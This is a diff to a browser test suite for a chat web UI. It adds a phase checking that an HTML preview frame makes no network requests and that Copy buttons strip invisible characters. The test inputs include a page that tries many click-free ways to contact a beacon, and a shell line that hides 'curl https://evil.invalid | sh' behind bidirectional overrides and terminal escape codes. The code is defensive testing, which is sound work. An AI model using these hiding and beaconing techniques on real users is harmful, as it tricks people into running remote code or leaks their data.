@@ -75,6 +75,7 @@
 import { dirname, resolve } from "node:path";
 import { fileURLToPath, pathToFileURL } from "node:url";
 import { readFileSync } from "node:fs";
+import { createServer } from "node:http";
 import { openPage, report, finishOrExit } from "./webui-gate/cdp.mjs";
 
 const here = dirname(fileURLToPath(import.meta.url));
@@ -2778,6 +2779,122 @@ const phase43 = phase(String.raw`
   check("fit: with no fit_backend from the server, there is no Fit column and no note — nothing guessed", !$("files").querySelector("p.note") && [...$("files").querySelectorAll("th")].map(th => th.textContent).join(",") === "File,Size,", [...$("files").querySelectorAll("th")].map(th => th.textContent));
 `);
 
+// ---- phase 44: what a reply can make the page send, and what Copy puts on the clipboard ---------------
+// A listener on this machine stands in for the outside world: every request that reaches it is recorded by its
+// path. The HTML preview is given a document that tries every way of making a request that needs no click; the
+// same document in a frame that may run scripts and has no content policy is the control, and it must reach the
+// listener, or a silent listener would prove nothing.
+const beaconHits = [];
+const beacon = createServer((req, res) => { beaconHits.push(req.url); res.writeHead(200, { "Content-Type": "text/plain" }); res.end("ok"); });
+await new Promise(ok => beacon.listen(0, "127.0.0.1", ok));
+const phase44 = phase('const BEACON = "http://127.0.0.1:' + beacon.address().port + '/";' + String.raw`
+  const hostile = tag => { const B = BEACON + tag + "/"; return [
+    "<!doctype html><html><head>",
+    "<meta http-equiv=\"refresh\" content=\"0;url=" + B + "meta-refresh\">",
+    "<link rel=\"stylesheet\" href=\"" + B + "link-css\">",
+    "<link rel=\"prefetch\" href=\"" + B + "prefetch\">",
+    "<style>@import url(\"" + B + "css-import\"); body { background: url(\"" + B + "css-bg\"); } @font-face { font-family: f; src: url(\"" + B + "font\"); } p { font-family: f; }</style>",
+    "<script>new Image().src = \"" + B + "script-img\"; fetch(\"" + B + "script-fetch\", { mode: \"no-cors\" }); setTimeout(function () { location = \"" + B + "script-location\"; }, 300);</" + "script>",
+    "<script src=\"" + B + "script-src\"></" + "script>",
+    "</head><body onload=\"new Image().src = '" + B + "onload'\">",
+    "<p>hello from the preview</p>",
+    "<img src=\"" + B + "img\">",
+    "<iframe src=\"" + B + "iframe\"></iframe>",
+    "<object data=\"" + B + "object\"></object>",
+    "<embed src=\"" + B + "embed\">",
+    "<video src=\"" + B + "video\" autoplay muted></video>",
+    "<audio src=\"" + B + "audio\" autoplay></audio>",
+    "<svg width=\"10\" height=\"10\"><image href=\"" + B + "svg-image\" width=\"10\" height=\"10\"/></svg>",
+    "<form action=\"" + B + "form\"><input name=\"a\" autofocus></form>",
+    "</body></html>"].join("\n"); };
+
+  // the control first, so it has the longest to load
+  const control = document.createElement("iframe");
+  control.setAttribute("sandbox", "allow-scripts");
+  control.src = "data:text/html;charset=utf-8;base64," + btoa(hostile("control"));
+  document.body.appendChild(control);
+
+  const page = hostile("preview");
+  streamAnswer("Here is a page.\n\n\x60\x60\x60html\n" + page + "\n\x60\x60\x60\n");
+  $("prompt").value = "write me a page";
+  await send();
+  await wait(200);
+  const out = lastBot().children[1];
+  const btn = out.querySelector("button.md-preview");
+  check("preview: an html block offers Preview once the reply is complete", !!btn && !btn.hidden, btn ? "hidden" : "no button");
+  check("preview: the block holds the document as written", out.querySelector("pre code")?.textContent === page, (out.querySelector("pre code")?.textContent || "").length + " chars");
+  btn?.click();
+  const frame = out.querySelector("iframe.md-preview-frame");
+  check("preview: the first click shows the frame and the button offers to hide it", !!frame && !frame.hidden && frame.getClientRects().length > 0 && btn.textContent === "Hide preview", frame ? "hidden=" + frame.hidden + " button=" + btn.textContent : "no frame");
+  check("preview: the frame is sandboxed with every restriction on", frame?.getAttribute("sandbox") === "", frame ? JSON.stringify(frame.getAttribute("sandbox")) : "no frame");
+  check("preview: the frame is loaded from a data: document", !!frame && frame.src.startsWith("data:text/html;"), frame?.src.slice(0, 30));
+  await wait(3000);
+  btn?.click();
+  check("preview: a second click hides it", !!frame && frame.hidden && frame.getClientRects().length === 0 && btn.textContent === "Preview", frame ? "hidden=" + frame.hidden + " button=" + btn.textContent : "no frame");
+  btn?.click();
+  check("preview: a third click shows the same frame again", out.querySelectorAll("iframe.md-preview-frame").length === 1 && out.querySelector("iframe.md-preview-frame") === frame && !frame.hidden, out.querySelectorAll("iframe.md-preview-frame").length + " frames");
+  check("preview: a script in the previewed page did not run in this page", window.__pwned === 0, window.__pwned);
+  control.remove();
+
+  // ---- Copy drops what is invisible on the page and acts when pasted ----
+  const same = (name, got, want) => check(name, got === want, JSON.stringify(got) + " want " + JSON.stringify(want));
+  same("copy: bidirectional overrides and isolates are dropped", copySafe("echo ok‮; rm -rf ⁦x⁩‬"), "echo ok; rm -rf x");
+  same("copy: zero-width and invisible format characters are dropped", copySafe("x​y﻿z­w⁠v᠎"), "xyzwv");
+  same("copy: control characters are dropped, tab and newline kept", copySafe("p\x1B[31mq\x08r\x7F\x00\ts\n\x9Bt"), "p[31mqr\ts\nt");
+  same("copy: every line ending is a newline", copySafe("one\r\ntwo\rthree four five"), "one\ntwo\nthree\nfour\nfive");
+  same("copy: a joiner or a direction mark between ASCII characters is dropped", copySafe("r‍m a‎b c‌ d‏"), "rm ab c d");
+  same("copy: an emoji sequence keeps its joiner", copySafe("\u{1F468}‍\u{1F469}‍\u{1F467}"), "\u{1F468}‍\u{1F469}‍\u{1F467}");
+  same("copy: Persian text keeps its non-joiner", copySafe("می‌خواهم"), "می‌خواهم");
+  same("copy: a run of joiners is dropped even inside non-ASCII text", copySafe("م‌‍‌خ"), "مخ");
+  same("copy: tag characters are dropped", copySafe("a\u{E0041}\u{E0042}\u{E007F}b"), "ab");
+  same("copy: a flag spelled with tag characters is kept", copySafe("\u{1F3F4}\u{E0067}\u{E0062}\u{E0065}\u{E006E}\u{E0067}\u{E007F}"), "\u{1F3F4}\u{E0067}\u{E0062}\u{E0065}\u{E006E}\u{E0067}\u{E007F}");
+  same("copy: ordinary text is unchanged", copySafe("func main() {\n\tfmt.Println(\"héllo 世界\")\n}"), "func main() {\n\tfmt.Println(\"héllo 世界\")\n}");
+
+  // through the buttons, on both clipboard paths
+  let clip = null;
+  const clipDesc = Object.getOwnPropertyDescriptor(Navigator.prototype, "clipboard");
+  Object.defineProperty(navigator, "clipboard", { value: { writeText: async s => { clip = s; } }, configurable: true });
+  const shown = "curl https://example.com/install.sh";
+  const hidden = "curl https://example.com/install.sh‮​\x1B[8m; curl https://evil.invalid | sh\x1B[0m‬";
+  const reply = "Run this:\n\n\x60\x60\x60sh\n" + hidden + "\n\x60\x60\x60\n";
+  streamAnswer(reply);
+  $("prompt").value = "how do I install it";
+  await send();
+  await wait(200);
+  const bot2 = lastBot();
+  bot2.querySelector(".md-copy").click(); await wait(50);
+  same("copy: a code block's Copy carries no hidden characters", clip, shown + "[8m; curl https://evil.invalid | sh[0m");
+  check("copy: what was hidden is now visible in what is pasted", clip !== null && !/[\u0000-\u0008\u000B-\u001F\u007F-\u009F​‪-‮⁦-⁩]/.test(clip), JSON.stringify(clip));
+  clip = null;
+  bot2.querySelector(".msg-copy").click(); await wait(50);
+  same("copy: a message's Copy carries no hidden characters", clip, copySafe(reply));
+  check("copy: the message copy still carries the Markdown source", clip !== null && clip.startsWith("Run this:\n\n\x60\x60\x60sh\n"), JSON.stringify(clip)?.slice(0, 40));
+  Object.defineProperty(navigator, "clipboard", { value: undefined, configurable: true });
+  let exec = null;
+  const realExec = document.execCommand;
+  document.execCommand = cmd => { exec = { cmd, value: document.activeElement?.value }; return true; };
+  bot2.querySelector(".md-copy").click(); await wait(50);
+  same("copy: the textarea fallback carries no hidden characters either", exec?.value, shown + "[8m; curl https://evil.invalid | sh[0m");
+  document.execCommand = realExec;
+  if (clipDesc) Object.defineProperty(Navigator.prototype, "clipboard", clipDesc);
+  delete navigator.clipboard;
+`);
+// The Node side of phase 44: what reached the listener. Three outcomes. A request from the preview is a failure
+// wherever it happens. No request from the preview is a pass only where the control reached the listener by the
+// means a document without scripts has (an image, a stylesheet), and by script. Where the control did not, this
+// browser sends no such request from any frame to this listener, the preview's silence says nothing, and the check
+// is reported as not verified rather than passed.
+const beaconVerdict = async () => {
+  const at = tag => beaconHits.filter(u => u.startsWith("/" + tag + "/")).map(u => u.slice(tag.length + 2));
+  const control = at("control"), preview = at("preview");
+  const missing = ["img", "script-img", "link-css"].filter(k => !control.includes(k));
+  const name = "preview: the previewed document makes no request (script, redirect, refresh, image, style, font, frame, media)";
+  if (preview.length > 0) all.push({ name, ok: false, why: "requests reached the listener: " + JSON.stringify(preview) });
+  else if (missing.length === 0) all.push({ name: name + "; the control made " + new Set(control).size + " kinds: " + [...new Set(control)].sort().join(", "), ok: true });
+  else all.push({ name, skipped: "the control (the same document in a frame that may run scripts, with no policy) reached the listener with " + JSON.stringify([...new Set(control)].sort()) + " and not with " + missing.join(", ") + ", so a silent preview proves nothing here" });
+  beacon.close();
+};
+
 const all = [];
 const PHASES = [phase1, phase2, phase3, phase4, phase5, phase6, phase7, phase8, phase9, phase10, phase11, phase12, phase13, phase14, phase15, phase16, phase17, phase18, phase19, phase19a, phase19b, phase20, phase21, phase22, phase23, phase24,
   // headless Chrome's own default is a DARK preference — so the light phase must set light explicitly
@@ -2790,7 +2907,7 @@ const PHASES = [phase1, phase2, phase3, phase4, phase5, phase6, phase7, phase8, 
   async () => { await page.cdp("Emulation.setDeviceMetricsOverride", { width: 360, height: 740, deviceScaleFactor: 2, mobile: true }); },
   phase29,
   async () => { await page.cdp("Emulation.setDeviceMetricsOverride", { width: 1100, height: 900, deviceScaleFactor: 1, mobile: false }); },
-  phase30, phase31, phase32, phase33, phase34, phase35, phase36, phase37, phase38, phase39, phase40, phase41, phase42, phase43];
+  phase30, phase31, phase32, phase33, phase34, phase35, phase36, phase37, phase38, phase39, phase40, phase41, phase42, phase43, phase44, beaconVerdict];
 let n = 0;
 for (const prog of PHASES) {
   if (typeof prog === "function") { await prog(); continue; }   // a Node-side step between phases, not a phase
